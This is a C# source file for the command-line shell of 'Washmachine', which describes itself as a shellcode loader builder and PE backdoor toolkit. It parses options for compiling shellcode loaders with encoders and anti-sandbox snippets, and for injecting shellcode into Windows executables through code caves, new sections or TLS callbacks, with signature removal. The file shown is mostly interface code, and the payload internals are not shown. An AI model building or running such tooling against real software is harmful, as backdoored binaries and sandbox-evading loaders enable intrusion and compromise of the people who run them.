using System.Globalization;
using System.Text;
using System.Text.Json;
using Spectre.Console;
using Spectre.Console.Rendering;
using Washmachine.Cli.Ui;
using Washmachine.Logging;
using Washmachine.Models;
using Washmachine.Services;
using Washmachine.Testing;

namespace Washmachine.Cli;

public static class Program
{
    private static readonly JsonSerializerOptions JsonPrint = new() { WriteIndented = false };
    private static readonly Dictionary<string, List<string>> InputHistory = new(StringComparer.OrdinalIgnoreCase);
    private static readonly string[] RootReplCommands =
    {
        "encode", "analyze", "backdoor", "strip", "list", "provision", "test", "help",
        "banner", "clear", "cls", "exit", "quit", "q"
    };
    private static readonly string[] SubModeCommands = { "help", "back", "exit", "..", "q" };
    private static readonly string[] ListTargets = { "--templates", "--encoders", "--snippets", "--compilers" };
    private static readonly string[] ListTargetsBare = { "templates", "encoders", "snippets", "compilers" };
    private static readonly string[] BackdoorMethodValues = { "code-cave", "new-section", "section-ext", "text-pad", "tls-callback" };
    private static readonly string[] BackdoorEncryptionValues = { "none" };
    private static readonly string[] BackdoorCarrierValues = { "entry-point" };
    private static readonly string[] StripModeValues = { "ep", "entry-point", "section", "all-exec", "range" };
    private static readonly Dictionary<string, string[]> CommandOptionCompletions = new(StringComparer.OrdinalIgnoreCase)
    {
        ["encode"] = new[]
        {
            "--shellcode", "-s", "--shellcode-hex", "--shellcode-url", "-u", "--template", "-t",
            "--encoder", "-e", "--envelope", "-v", "--snippet", "--verbose", "--json"
        },
        ["analyze"] = new[] { "--json" },
        ["backdoor"] = new[]
        {
            "--pe", "--shellcode", "-s", "--output", "-o", "--method", "-m", "--encryption", "--enc",
            "--xor-key", "--section-name", "--no-remove-sig", "--no-patch-subsystem", "--carrier",
            "--invoke", "--no-preserve-entry", "--no-patch-iat", "--no-patch-exit", "--cave-min-size",
            "--dry-run", "--verbose", "--json"
        },
        ["strip"] = new[] { "-o", "--output", "--mode", "-m", "--section", "--analyze", "--no-trim", "--range" },
        ["list"] = ListTargets,
        ["provision"] = Array.Empty<string>(),
        ["test"] = new[] { "--help", "-h" },
        ["help"] = new[] { "encode", "analyze", "backdoor", "strip", "list", "provision", "test", "--all" }
    };
    private static bool _isRepl;

    public static async Task<int> Main(string[] args)
    {
        Console.OutputEncoding = System.Text.Encoding.UTF8;
        Console.InputEncoding = System.Text.Encoding.UTF8;

        // One-shot mode: command provided on command line (e.g., from GUI or scripts)
        if (args.Length > 0)
        {
            return await DispatchAsync(args);
        }

        // Interactive REPL mode — Metasploit-style shell
        ShowBanner();
        return await RunReplAsync();
    }

    /// <summary>Dispatch a single command (one-shot or from REPL).</summary>
    private static async Task<int> DispatchAsync(string[] args)
    {
        bool jsonMode = args.Any(a => a == "--json");

        var command = args[0].ToLowerInvariant();
        var cmdArgs = args.Skip(1).ToArray();

        // Check if the command's first arg is a help flag
        bool wantsHelp = cmdArgs.Length > 0 && cmdArgs[0] is "help" or "--help" or "-h";

        return command switch
        {
            "encode"    => wantsHelp ? PrintEncodeUsage() : await RunEncodeAsync(cmdArgs),
            "analyze"   => wantsHelp ? PrintAnalyzeUsage() : await RunAnalyzeAsync(cmdArgs),
            "backdoor"  => wantsHelp ? PrintBackdoorUsage() : await RunBackdoorAsync(cmdArgs),
            "strip"     => wantsHelp ? PrintStripUsage() : await RunStripAsync(cmdArgs),
            "list"      => wantsHelp ? PrintListUsage() : await RunListAsync(cmdArgs),
            "provision" => wantsHelp ? PrintProvisionUsage() : await RunProvisionAsync(cmdArgs),
            "test"      => wantsHelp ? PrintTestUsage() : await TestHarness.RunAsync(cmdArgs),
            "help" or "--help" or "-h" => HandleHelp(cmdArgs),
            _ => PrintUnknownCommand(command),
        };
    }

    /// <summary>Route help to per-command help when a subcommand is specified.</summary>
    private static int HandleHelp(string[] args)
    {
        if (args.Length == 0) return PrintUsage();
        return args[0].ToLowerInvariant() switch
        {
            "encode"    => PrintEncodeUsage(),
            "analyze"   => PrintAnalyzeUsage(),
            "backdoor"  => PrintBackdoorUsage(),
            "strip"     => PrintStripUsage(),
            "list"      => PrintListUsage(),
            "provision" => PrintProvisionUsage(),
            "test"      => PrintTestUsage(),
            "--all" or "-a" or "all" => PrintExtendedHelp(),
            _ => PrintUsage(),
        };
    }

    /// <summary>Interactive read-eval-print loop.</summary>
    private static async Task<int> RunReplAsync()
    {
        _isRepl = true;
        while (true)
        {
            AnsiConsole.WriteLine();
            string? input;
            try
            {
                input = ReadLineWithEditor($"[{UiColors.Header}]washmachine[/] [{UiColors.Accent}]❯[/] ", "root");
            }
            catch (InvalidOperationException)
            {
                // Non-interactive terminal (piped input exhausted)
                break;
            }

            if (input is null)
                break;

            var line = input.Trim();
            if (string.IsNullOrEmpty(line))
                continue;

            switch (line.ToLowerInvariant())
            {
                case "exit" or "quit" or "q":
                    AnsiConsole.MarkupLine("[dim]Goodbye.[/]");
                    return 0;
                case "clear" or "cls":
                    AnsiConsole.Clear();
                    continue;
                case "banner":
                    ShowBanner();
                    continue;
                case "help" or "?" or "--help":
                    PrintUsage();
                    continue;
            }

            // Tokenize input (respecting quoted strings)
            var tokens = TokenizeLine(line);
            if (tokens.Length == 0) continue;

            try
            {
                await DispatchAsync(tokens);
            }
            catch (Exception ex)
            {
                AnsiConsole.MarkupLine($"[red]Error:[/] {Markup.Escape(ex.Message)}");
            }
        }

        return 0;
    }

    /// <summary>Split a command line into tokens, respecting double-quoted strings.</summary>
    private static string[] TokenizeLine(string line)
    {
        var tokens = new List<string>();
        var current = new StringBuilder();
        bool inQuote = false;

        foreach (char c in line)
        {
            if (c == '"')
            {
                inQuote = !inQuote;
            }
            else if (c == ' ' && !inQuote)
            {
                if (current.Length > 0)
                {
                    tokens.Add(current.ToString());
                    current.Clear();
                }
            }
            else
            {
                current.Append(c);
            }
        }

        if (current.Length > 0)
            tokens.Add(current.ToString());

        return tokens.ToArray();
    }

    /// <summary>Enter a sub-mode REPL for a given command when invoked with no args in REPL mode.</summary>
    private static async Task<int> RunSubMode(string modeName, Func<string[], Task<int>> handler, Func<int>? helpFunc = null)
    {
        if (!_isRepl)
        {
            helpFunc?.Invoke();
            return 1;
        }

        while (true)
        {
            AnsiConsole.WriteLine();
            string? input;
            try
            {
                input = ReadLineWithEditor(
                    $"[{UiColors.Header}]washmachine[/] [{UiColors.Accent}]{Markup.Escape(modeName)}[/] [{UiColors.Accent}]>[/] ",
                    modeName,
                    modeName);
            }
            catch (InvalidOperationException) { break; }

            if (input is null) break;

            var cmd = input.Trim();
            if (string.IsNullOrEmpty(cmd)) continue;
            if (cmd.ToLowerInvariant() is "back" or "exit" or ".." or "q") break;
            if (cmd.ToLowerInvariant() is "help" or "?") { helpFunc?.Invoke(); continue; }

            var tokens = TokenizeLine(cmd);
            if (tokens.Length == 0) continue;

            try { await handler(tokens); }
            catch (Exception ex) { AnsiConsole.MarkupLine($"[red]Error:[/] {Markup.Escape(ex.Message)}"); }
        }
        return 0;
    }

    private static string? ReadLineWithEditor(string promptMarkup, string historyScope, string? fixedCommand = null)
    {
        if (Console.IsInputRedirected || Console.IsOutputRedirected)
            return Console.ReadLine();

        AnsiConsole.Markup(promptMarkup);

        int originLeft = Console.CursorLeft;
        int originTop = Console.CursorTop;
        int previousRenderLines = 1;
        int cursorIndex = 0;
        var buffer = new StringBuilder();
        var history = GetHistoryBucket(historyScope);
        int historyIndex = history.Count;
        string draft = string.Empty;

        void ReplaceBuffer(string value)
        {
            buffer.Clear();
            buffer.Append(value);
            cursorIndex = buffer.Length;
        }

        void Render()
        {
            try
            {
                int width = Math.Max(Console.BufferWidth, 1);
                int bufferHeight = Math.Max(Console.BufferHeight, 1);

                // Clamp origin if console was resized (zoom in/out)
                originTop = Math.Clamp(originTop, 0, bufferHeight - 1);
                originLeft = Math.Clamp(originLeft, 0, width - 1);

                int currentRenderLines = GetWrappedLineCount(originLeft, buffer.Length, width);
                int linesToClear = Math.Max(previousRenderLines, currentRenderLines);

                for (int i = 0; i < linesToClear; i++)
                {
                    int row = originTop + i;
                    if (row >= bufferHeight) break;
                    int left = i == 0 ? originLeft : 0;
                    Console.SetCursorPosition(left, row);
                    Console.Write(new string(' ', Math.Max(1, width - left)));
                }

                Console.SetCursorPosition(originLeft, originTop);
                Console.Write(buffer.ToString());

                previousRenderLines = currentRenderLines;

                int absoluteIndex = originLeft + cursorIndex;
                int cursorTop = Math.Min(originTop + (absoluteIndex / width), bufferHeight - 1);
                int cursorLeft = Math.Clamp(absoluteIndex % width, 0, width - 1);
                Console.SetCursorPosition(cursorLeft, cursorTop);
            }
            catch (ArgumentOutOfRangeException)
            {
                // Console was resized mid-render; safe to ignore
            }
        }

        void ShowCompletionChoices(IReadOnlyList<string> matches)
        {
            AnsiConsole.WriteLine();
            foreach (var chunk in matches.Chunk(6))
                AnsiConsole.MarkupLine($"[dim]  {string.Join("  ", chunk.Select(Markup.Escape))}[/]");

            AnsiConsole.Markup(promptMarkup);
            originLeft = Console.CursorLeft;
            originTop = Console.CursorTop;
            previousRenderLines = 1;
            Render();
        }

        while (true)
        {
            ConsoleKeyInfo key;
            try
            {
                key = Console.ReadKey(intercept: true);
            }
            catch (InvalidOperationException)
            {
                Console.WriteLine();
                return buffer.ToString();
            }

            switch (key.Key)
            {
                case ConsoleKey.Enter:
                {
                    Console.WriteLine();
                    var line = buffer.ToString();
                    AddHistoryEntry(historyScope, line);
                    return line;
                }
                case ConsoleKey.LeftArrow:
                    if (cursorIndex > 0)
                    {
                        cursorIndex--;
                        Render();
                    }
                    break;
                case ConsoleKey.RightArrow:
                    if (cursorIndex < buffer.Length)
                    {
                        cursorIndex++;
                        Render();
                    }
                    break;
                case ConsoleKey.Home:
                    if (cursorIndex != 0)
                    {
                        cursorIndex = 0;
                        Render();
                    }
                    break;
                case ConsoleKey.End:
                    if (cursorIndex != buffer.Length)
                    {
                        cursorIndex = buffer.Length;
                        Render();
                    }
                    break;
                case ConsoleKey.Backspace:
                    if (cursorIndex > 0)
                    {
                        buffer.Remove(cursorIndex - 1, 1);
                        cursorIndex--;
                        historyIndex = history.Count;
                        Render();
                    }
                    break;
                case ConsoleKey.Delete:
                    if (cursorIndex < buffer.Length)
                    {
                        buffer.Remove(cursorIndex, 1);
                        historyIndex = history.Count;
                        Render();
                    }
                    break;
                case ConsoleKey.UpArrow:
                    if (history.Count > 0)
                    {
                        if (historyIndex == history.Count)
                            draft = buffer.ToString();

                        if (historyIndex > 0)
                        {
                            historyIndex--;
                            ReplaceBuffer(history[historyIndex]);
                            Render();
                        }
                    }
                    break;
                case ConsoleKey.DownArrow:
                    if (history.Count > 0)
                    {
                        if (historyIndex < history.Count - 1)
                        {
                            historyIndex++;
                            ReplaceBuffer(history[historyIndex]);
                            Render();
                        }
                        else if (historyIndex == history.Count - 1)
                        {
                            historyIndex = history.Count;
                            ReplaceBuffer(draft);
                            Render();
                        }
                    }
                    break;
                case ConsoleKey.Tab:
                {
                    var matches = GetCompletionMatches(fixedCommand, buffer.ToString(), cursorIndex, out int replaceStart, out int replaceEnd, out string currentPrefix);
                    if (matches.Count == 0)
                        break;

                    if (matches.Count == 1)
                    {
                        buffer.Remove(replaceStart, replaceEnd - replaceStart);
                        buffer.Insert(replaceStart, matches[0]);
                        cursorIndex = replaceStart + matches[0].Length;
                        historyIndex = history.Count;
                        Render();
                        break;
                    }

                    var commonPrefix = GetCommonPrefix(matches);
                    if (!string.IsNullOrEmpty(commonPrefix) && commonPrefix.Length > currentPrefix.Length)
                    {
                        buffer.Remove(replaceStart, replaceEnd - replaceStart);
                        buffer.Insert(replaceStart, commonPrefix);
                        cursorIndex = replaceStart + commonPrefix.Length;
                        historyIndex = history.Count;
                        Render();
                        break;
                    }

                    ShowCompletionChoices(matches);
                    break;
                }
                default:
                    if (key.Modifiers.HasFlag(ConsoleModifiers.Control) && key.Key == ConsoleKey.A)
                    {
                        if (cursorIndex != 0)
                        {
                            cursorIndex = 0;
                            Render();
                        }
                    }
                    else if (key.Modifiers.HasFlag(ConsoleModifiers.Control) && key.Key == ConsoleKey.E)
                    {
                        if (cursorIndex != buffer.Length)
                        {
                            cursorIndex = buffer.Length;
                            Render();
                        }
                    }
                    else if (!char.IsControl(key.KeyChar))
                    {
                        buffer.Insert(cursorIndex, key.KeyChar);
                        cursorIndex++;
                        historyIndex = history.Count;
                        Render();
                    }
                    break;
            }
        }
    }

    private static List<string> GetHistoryBucket(string historyScope)
    {
        if (!InputHistory.TryGetValue(historyScope, out var bucket))
        {
            bucket = new List<string>();
            InputHistory[historyScope] = bucket;
        }

        return bucket;
    }

    private static void AddHistoryEntry(string historyScope, string line)
    {
        if (string.IsNullOrWhiteSpace(line))
            return;

        var bucket = GetHistoryBucket(historyScope);
        if (bucket.Count == 0 || !string.Equals(bucket[^1], line, StringComparison.Ordinal))
            bucket.Add(line);

        const int maxHistoryEntries = 200;
        if (bucket.Count > maxHistoryEntries)
            bucket.RemoveAt(0);
    }

    private static IReadOnlyList<string> GetCompletionMatches(string? fixedCommand, string line, int cursorIndex, out int replaceStart, out int replaceEnd, out string currentPrefix)
    {
        GetCurrentWordSpan(line, cursorIndex, out replaceStart, out replaceEnd);

        string beforeCursor = line[..cursorIndex];
        var tokensBeforeCursor = TokenizeLine(beforeCursor);
        bool atTokenBoundary = cursorIndex == 0 || char.IsWhiteSpace(line[cursorIndex - 1]);
        currentPrefix = atTokenBoundary || tokensBeforeCursor.Length == 0 ? string.Empty : tokensBeforeCursor[^1];
        int currentTokenIndex = atTokenBoundary ? tokensBeforeCursor.Length : tokensBeforeCursor.Length - 1;

        IEnumerable<string> matches;
        if (fixedCommand is null)
        {
            if (currentTokenIndex == 0)
            {
                matches = FilterCompletionMatches(RootReplCommands, currentPrefix);
            }
            else
            {
                string command = tokensBeforeCursor[0].ToLowerInvariant();
                matches = GetCommandCompletionMatches(command, tokensBeforeCursor.Skip(1).ToArray(), currentTokenIndex - 1, currentPrefix, includeSubModeCommands: false);
            }
        }
        else
        {
            matches = GetCommandCompletionMatches(fixedCommand, tokensBeforeCursor, currentTokenIndex, currentPrefix, includeSubModeCommands: true);
        }

        return matches.ToArray();
    }

    private static IEnumerable<string> GetCommandCompletionMatches(string command, string[] argTokens, int currentArgIndex, string currentPrefix, bool includeSubModeCommands)
    {
        if (command.Equals("help", StringComparison.OrdinalIgnoreCase))
            return currentArgIndex == 0 ? FilterCompletionMatches(CommandOptionCompletions["help"], currentPrefix) : Array.Empty<string>();

        string? previousToken = GetPreviousToken(argTokens, currentArgIndex);
        var valueCandidates = GetOptionValueCandidates(command, previousToken);
        if (valueCandidates.Length > 0)
            return FilterCompletionMatches(valueCandidates, currentPrefix);

        if (command.Equals("list", StringComparison.OrdinalIgnoreCase) && currentArgIndex == 0)
        {
            var listCandidates = currentPrefix.StartsWith("-", StringComparison.Ordinal)
                ? ListTargets
                : ListTargetsBare.Concat(ListTargets).ToArray();
            return FilterCompletionMatches(listCandidates, currentPrefix);
        }

        var candidates = new List<string>();
        if (includeSubModeCommands && currentArgIndex == 0)
            candidates.AddRange(SubModeCommands);

        if (CommandOptionCompletions.TryGetValue(command, out var options))
            candidates.AddRange(options);

        return FilterCompletionMatches(candidates, currentPrefix);
    }

    private static string[] GetOptionValueCandidates(string command, string? previousToken)
    {
        if (string.IsNullOrEmpty(previousToken))
            return Array.Empty<string>();

        return command.ToLowerInvariant() switch
        {
            "backdoor" when previousToken is "--method" or "-m" => BackdoorMethodValues,
            "backdoor" when previousToken is "--encryption" or "--enc" => BackdoorEncryptionValues,
            "backdoor" when previousToken is "--carrier" or "--invoke" => BackdoorCarrierValues,
            "strip" when previousToken is "--mode" or "-m" => StripModeValues,
            _ => Array.Empty<string>()
        };
    }

    private static IEnumerable<string> FilterCompletionMatches(IEnumerable<string> candidates, string prefix)
    {
        return candidates
            .Where(c => string.IsNullOrEmpty(prefix) || c.StartsWith(prefix, StringComparison.OrdinalIgnoreCase))
            .Distinct(StringComparer.OrdinalIgnoreCase)
            .OrderBy(c => c, StringComparer.OrdinalIgnoreCase);
    }

    private static string? GetPreviousToken(string[] argTokens, int currentArgIndex)
    {
        if (argTokens.Length == 0)
            return null;

        if (currentArgIndex >= argTokens.Length)
            return argTokens[^1];

        return currentArgIndex > 0 ? argTokens[currentArgIndex - 1] : null;
    }

    private static void GetCurrentWordSpan(string line, int cursorIndex, out int start, out int end)
    {
        start = cursorIndex;
        while (start > 0 && !char.IsWhiteSpace(line[start - 1]))
            start--;

        end = cursorIndex;
        while (end < line.Length && !char.IsWhiteSpace(line[end]))
            end++;
    }

    private static int GetWrappedLineCount(int originLeft, int textLength, int consoleWidth)
    {
        if (consoleWidth <= 0)
            return 1;

        if (textLength == 0)
            return 1;

        return ((originLeft + textLength) / consoleWidth) + 1;
    }

    private static string GetCommonPrefix(IReadOnlyList<string> values)
    {
        if (values.Count == 0)
            return string.Empty;

        string prefix = values[0];
        for (int i = 1; i < values.Count; i++)
        {
            int max = Math.Min(prefix.Length, values[i].Length);
            int len = 0;
            while (len < max && char.ToUpperInvariant(prefix[len]) == char.ToUpperInvariant(values[i][len]))
                len++;

            prefix = prefix[..len];
            if (prefix.Length == 0)
                break;
        }

        return prefix;
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  Banner
    // ═══════════════════════════════════════════════════════════════════════

    private static readonly string[] FunnyFacts =
    {
        "VirtualAlloc: the real estate agent of process memory.",
        "Your AV just flagged this help text as suspicious.",
        "Kernel32.dll has been loaded more times than any webpage.",
        "The first computer virus (Brain, 1986) had better OPSEC than most APTs.",
        "73% of statistics about malware are made up on the spot.",
        "CreateRemoteThread walks into a bar. The bouncer says: 'You're not on the list.'",
        "If debugging is removing bugs, then programming is putting them in.",
        "There are 10 types of people: those who understand binary and those who don't.",
        "Why do programmers prefer dark mode? Because light attracts bugs.",
        "A SQL query walks into a bar, sees two tables and asks: 'Can I join you?'",
        "UDP joke: I'd tell you one, but you might not get it.",
        "The average shellcode has more NOPs than a politician's speech.",
        "Roses are #FF0000, Violets are #0000FF, All my base are belong to you.",
        "There's no place like 127.0.0.1.",
        "To understand recursion, you must first understand recursion.",
    };

    private static void ShowBanner()
    {
        AnsiConsole.WriteLine();
        AnsiConsole.Write(new FigletText("WASHMACHINE").Color(UiColors.BannerColor));

        // Dynamic catalog counts
        int templateCount = 0, sectionCount = 0, snippetCount = 0;
        try
        {
            var paths = new AppPaths();
            var snippetService = new YamlCodeSnippetCatalogService(paths);
            var sections = snippetService.GetAllSections();
            sectionCount = sections.Count;
            snippetCount = sections.Sum(s => s.Items.Count);
            templateCount = snippetService.GetTemplates().Count;
        }
        catch { /* catalog not available yet */ }

        // Info bar in a panel
        var fact = FunnyFacts[Random.Shared.Next(FunnyFacts.Length)];
        var infoGrid = new Grid()
            .AddColumn(new GridColumn().NoWrap())
            .AddColumn(new GridColumn().NoWrap())
            .AddColumn(new GridColumn().NoWrap())
            .AddColumn(new GridColumn().NoWrap())
            .AddColumn(new GridColumn().NoWrap())
            .AddColumn(new GridColumn().NoWrap())
            .AddColumn(new GridColumn().NoWrap());
        infoGrid.AddRow(
            $"[bold {UiColors.Accent}]v1.0.0[/]",
            $"[{UiColors.Muted}]│[/]",
            $"[{UiColors.Value}]{templateCount} templates[/]",
            $"[{UiColors.Muted}]│[/]",
            $"[{UiColors.Value}]{sectionCount} playbook categories · {snippetCount} snippets[/]",
            $"[{UiColors.Muted}]│[/]",
            $"[{UiColors.Value}]5 injection methods[/]"
        );

        AnsiConsole.Write(UsageFormatter.MakePanel("Washmachine", infoGrid));

        AnsiConsole.MarkupLine($"  [{UiColors.Muted}]Shellcode Loader Builder & PE Backdoor Toolkit[/]");
        AnsiConsole.MarkupLine($"  [{UiColors.Muted}]by[/] [{UiColors.Link} link=https://github.com/0xhmza]0xhmza[/]");
        AnsiConsole.WriteLine();

        AnsiConsole.MarkupLine($"  [{UiColors.Muted}]Type[/] [{UiColors.Accent}]help[/] [{UiColors.Muted}]for commands,[/] [{UiColors.Accent}]help <command>[/] [{UiColors.Muted}]for details,[/] [{UiColors.Accent}]help --all[/] [{UiColors.Muted}]for full reference[/]");
        AnsiConsole.MarkupLine($"  [{UiColors.Muted}]Keys:[/] [{UiColors.Accent}]↑/↓[/] history  [{UiColors.Accent}]←/→[/] move  [{UiColors.Accent}]Home/End[/] jump  [{UiColors.Accent}]Tab[/] complete");
        AnsiConsole.WriteLine();
        AnsiConsole.MarkupLine($"  [{UiColors.Muted}]💡 {fact}[/]");
        AnsiConsole.WriteLine();
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  encode
    // ═══════════════════════════════════════════════════════════════════════

    private static async Task<int> RunEncodeAsync(string[] args)
    {
        if (args.Length == 0)
            return await RunSubMode("encode", RunEncodeAsync, PrintEncodeUsage);

        string? shellcodeFilePath = null;
        string? shellcodeHex = null;
        string? shellcodeUrl = null;
        string? templateId = null;
        string? encoderIndex = null;
        string? envelopeIndex = null;
        var snippets = new Dictionary<string, string>();
        bool verbose = false;
        bool jsonOutput = false;

        for (int i = 0; i < args.Length; i++)
        {
            switch (args[i])
            {
                case "--shellcode" or "-s" when i + 1 < args.Length:
                    shellcodeFilePath = args[++i]; break;
                case "--shellcode-hex" when i + 1 < args.Length:
                    shellcodeHex = args[++i]; break;
                case "--shellcode-url" or "-u" when i + 1 < args.Length:
                    shellcodeUrl = args[++i]; break;
                case "--template" or "-t" when i + 1 < args.Length:
                    templateId = args[++i]; break;
                case "--encoder" or "-e" when i + 1 < args.Length:
                    encoderIndex = args[++i]; break;
                case "--envelope" or "-v" when i + 1 < args.Length:
                    envelopeIndex = args[++i]; break;
                case "--snippet" when i + 1 < args.Length:
                    var kv = args[++i].Split('=', 2);
                    if (kv.Length == 2) snippets[kv[0]] = kv[1];
                    break;
                case "--verbose": verbose = true; break;
                case "--json": jsonOutput = true; break;
                default:
                    AnsiConsole.MarkupLine($"[red]Error:[/] Unknown option: {Markup.Escape(args[i])}");
                    return 1;
            }
        }

        if (shellcodeFilePath == null && shellcodeHex == null && shellcodeUrl == null)
        {
            AnsiConsole.MarkupLine("[red]Error:[/] provide --shellcode <file>, --shellcode-hex <hex>, or --shellcode-url <url>");
            return 1;
        }

        var logger = new ConsoleLogger();
        if (verbose) logger.VerboseEnabled = true;

        var paths = new AppPaths();

        // Ensure requirements (Bin2Shell) before compilation
        var provisioner = new RequirementProvisioner(paths, logger);
        await provisioner.EnsureRequirementsAsync(new ConsoleProgressReporter());

        var runner = new Bin2ShellRunner(paths);
        var snippetService = new YamlCodeSnippetCatalogService(paths);
        var toolLocator = new CompilerToolLocator(logger);
        var compiler = new CompilerService(paths, runner, snippetService, toolLocator, logger);

        // Build UiData from CLI arguments
        var textBoxes = new Dictionary<string, string>
        {
            [UiDataKeys.ShellcodeFile] = shellcodeFilePath ?? "",
            [UiDataKeys.ShellcodeRaw] = shellcodeHex ?? "",
            [UiDataKeys.ShellcodeUrl] = shellcodeUrl ?? "",
            [UiDataKeys.ShellcodeUrlFile] = "",
        };

        var comboBoxes = new Dictionary<string, string>
        {
            [UiDataKeys.Template] = templateId ?? "shellcode-minimal",
        };

        // Resolve encoder/envelope display text from catalog
        var encodingCatalog = new ShellcodeEncodingCatalogService(runner, paths);
        try
        {
            var catalog = await encodingCatalog.GetCatalogAsync();

            if (encoderIndex != null && int.TryParse(encoderIndex, out int encIdx))
            {
                var enc = catalog.Encoders.FirstOrDefault(e => e.Index == encIdx);
                comboBoxes[UiDataKeys.Encoder] = enc?.DisplayText ?? $"{encIdx} - custom";
            }
            else
            {
                comboBoxes[UiDataKeys.Encoder] = "0 - none";
            }

            if (envelopeIndex != null && int.TryParse(envelopeIndex, out int envIdx))
            {
                var env = catalog.Envelopes.FirstOrDefault(e => e.Index == envIdx);
                comboBoxes[UiDataKeys.Envelope] = env?.DisplayText ?? $"{envIdx} - custom";
            }
            else
            {
                comboBoxes[UiDataKeys.Envelope] = "0 - none";
            }
        }
        catch (Exception ex)
        {
            logger.Warn($"Could not load encoding catalog: {ex.Message}");
            comboBoxes[UiDataKeys.Encoder] = encoderIndex != null ? $"{encoderIndex} - custom" : "0 - none";
            comboBoxes[UiDataKeys.Envelope] = envelopeIndex != null ? $"{envelopeIndex} - custom" : "0 - none";
        }

        // Apply snippet selections.
        // Accept both internal format (snippetCombo_ANTISANDBOX_0=Default) and
        // friendly format (antisandbox=Default) which resolves via the catalog.
        foreach (var kv in snippets)
        {
            if (kv.Key.StartsWith("snippetCombo_", StringComparison.OrdinalIgnoreCase) ||
                kv.Key.StartsWith("snippetList_", StringComparison.OrdinalIgnoreCase))
            {
                comboBoxes[kv.Key] = kv.Value;
            }
            else if (snippetService.TryResolveSection(kv.Key, out var resolvedSection))
            {
                string comboName = SnippetControlNaming.GetComboName(resolvedSection, 0);
                comboBoxes[comboName] = kv.Value;
            }
            else
            {
                AnsiConsole.MarkupLine($"[yellow]Warning:[/] Unknown snippet section '{Markup.Escape(kv.Key)}'. Use 'list --snippets' to see available sections.");
            }
        }

        // Apply default snippets for the selected template
        if (snippetService.TryGetTemplate(comboBoxes[UiDataKeys.Template], out var tmpl))
        {
            foreach (var ph in tmpl.Placeholders.Where(p => p.Kind == TemplatePlaceholderKind.Snippet))
            {
                if (!snippetService.TryResolveSection(ph.SnippetTemplateKey, out var section))
                    continue;
                // Use GetComboName so the key is normalized (uppercase) and matches what the GUI sends.
                string comboName = SnippetControlNaming.GetComboName(section, 0);
                if (!comboBoxes.ContainsKey(comboName))
                {
                    var defaultItem = section.Items.FirstOrDefault(si => si.IsDefault)
                                      ?? section.Items.FirstOrDefault();
                    if (defaultItem != null)
                        comboBoxes[comboName] = defaultItem.Id;
                }
            }

            // Apply default input values
            foreach (var section in snippetService.GetAllSections())
            {
                foreach (var input in section.Inputs)
                {
                    if (!string.IsNullOrWhiteSpace(input.DefaultValue) && !textBoxes.ContainsKey(input.Id))
                        textBoxes[input.Id] = input.DefaultValue;
                }
            }
        }

        var data = new UiData(textBoxes, comboBoxes);

        try
        {
            var result = jsonOutput
                ? await compiler.CompileAsync(data)
                : await AnsiConsole.Status()
                    .Spinner(Spinner.Known.Dots)
                    .SpinnerStyle(Style.Parse("cyan"))
                    .StartAsync("Encoding...", async _ => await compiler.CompileAsync(data));

            if (jsonOutput)
            {
                var output = new
                {
                    result.Success,
                    result.OutputExePath,
                    result.GeneratedSourcePath,
                    Notes = result.Notes,
                    CompilerPath = result.Discovery?.Best?.Path,
                    ConversionSuccess = result.ConversionResult.Success,
                    ConversionError = result.ConversionResult.Error,
                };
                Console.WriteLine(JsonSerializer.Serialize(output, JsonPrint));
            }
            else
            {
                foreach (var note in result.Notes)
                    logger.Info(note);

                if (result.Success)
                {
                    AnsiConsole.Write(new Panel("[green3_1]Encoding succeeded.[/]")
                        .BorderColor(Color.Green)
                        .Border(BoxBorder.Rounded));
                }
                else
                {
                    AnsiConsole.Write(new Panel($"[red]Encoding failed: {Markup.Escape(result.ConversionResult.Error ?? "unknown")}[/]")
                        .BorderColor(Color.Red)
                        .Border(BoxBorder.Rounded));
                }
            }

            return result.Success ? 0 : 1;
        }
        catch (Exception ex)
        {
            logger.Error($"Fatal: {ex.Message}");
            return 1;
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  analyze
    // ═══════════════════════════════════════════════════════════════════════

    private static async Task<int> RunAnalyzeAsync(string[] args)
    {
        if (args.Length == 0)
            return await RunSubMode("analyze", RunAnalyzeAsync, PrintAnalyzeUsage);

        if (args[0] is "help" or "--help" or "-h")
        {
            PrintAnalyzeUsage();
            return 0;
        }

        var peFile = args[0];
        if (!File.Exists(peFile))
        {
            AnsiConsole.MarkupLine($"[red]Error:[/] File not found: {Markup.Escape(peFile)}");
            return 1;
        }

        bool jsonOutput = args.Contains("--json");
        var logger = new ConsoleLogger();
        var analyzer = new PeAnalyzerService(logger);

        try
        {
            var result = await analyzer.AnalyzeAsync(peFile);

            if (jsonOutput)
            {
                Console.WriteLine(JsonSerializer.Serialize(result, JsonPrint));
                return 0;
            }

            // ══════════════════════════════════════════════════════════
            //  DASHBOARD HEADER
            // ══════════════════════════════════════════════════════════
            string peTypeStr = result.IsDriver ? "Driver" : result.IsDll ? "DLL" : "EXE";
            string archShort = result.Is64Bit ? "x64" : "x86";

            var headerMarkup = new Markup(
                $"[bold {UiColors.Header}]\U0001f52c PE ANALYSIS REPORT[/]\n" +
                $"[{UiColors.Muted}]{new string('\u2500', 60)}[/]\n" +
                $"[{UiColors.Accent}]File:[/] [{UiColors.Value}]{Markup.Escape(result.FileName ?? Path.GetFileName(peFile))}[/]     " +
                $"[{UiColors.Accent}]Size:[/] [{UiColors.Value}]{Markup.Escape(result.FileSizeFormatted ?? $"{result.FileSize:N0} bytes")}[/]     " +
                $"[{UiColors.Accent}]Type:[/] [{UiColors.Value}]{peTypeStr} {archShort}[/]");

            AnsiConsole.Write(new Panel(headerMarkup)
                .Border(BoxBorder.Heavy)
                .BorderColor(Color.DarkViolet)
                .Expand());
            AnsiConsole.WriteLine();

            // ══════════════════════════════════════════════════════════
            //  FILE OVERVIEW + SECURITY SIDE-BY-SIDE
            // ══════════════════════════════════════════════════════════
            var overviewLines = new List<string>
            {
                $"[{UiColors.Accent}]File Name:[/]     [{UiColors.Value}]{Markup.Escape(result.FileName ?? "")}[/]",
                $"[{UiColors.Accent}]Size:[/]          [{UiColors.Value}]{Markup.Escape(result.FileSizeFormatted ?? $"{result.FileSize:N0} bytes")}[/]",
                $"[{UiColors.Accent}]SHA-256:[/]       [{UiColors.Muted}]{Markup.Escape(result.FileHash ?? "N/A")}[/]",
                $"[{UiColors.Accent}]Architecture:[/]  [{UiColors.Value}]{Markup.Escape(result.Architecture)}[/]",
